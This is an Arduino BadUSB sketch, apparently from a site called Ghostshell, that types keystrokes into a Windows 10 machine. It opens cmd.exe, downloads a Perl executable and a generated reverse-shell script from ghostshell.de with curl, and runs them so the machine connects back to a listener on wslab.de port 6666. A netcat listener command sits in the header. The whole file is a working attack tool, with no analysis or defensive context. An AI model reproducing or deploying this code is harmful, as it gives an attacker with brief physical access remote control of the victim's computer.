
// Ghostshell
// www.ghostshell.de
// Windows Reverse-Shell TCP PS
// Tested on Windows 10
// Listener: nc -lnvp 6666

#include "Keyboard.h"
 
void setup() {

}

void loop() {
Keyboard.begin();
delay(3000);
Keyboard.press(KEY_LEFT_GUI);
delay(1000);
Keyboard.press('r');
Keyboard.releaseAll();
delay(2000);
Keyboard.println("cmd.exe");
delay(500);
Keyboard.press(KEY_RETURN);


Keyboard.releaseAll();
delay(1000);
Keyboard.println("curl -O https://ghostshell.de/payloads/perl/perl_x32.exe");
delay(500);
Keyboard.press(KEY_RETURN);


Keyboard.releaseAll();
delay(1000);
Keyboard.println("curl -X GET -G https://ghostshell.de/payloads/gen_payload.php -d ip=wslab.de -d port=6666 -d os=windows_reverseshell_tcp_perl -o shell.pl");
delay(500);
Keyboard.press(KEY_RETURN);


Keyboard.releaseAll();
delay(3000);
Keyboard.println("perl_x32.exe shell.pl");
delay(500);
Keyboard.press(KEY_RETURN);


Keyboard.releaseAll();
delay(120000);
}
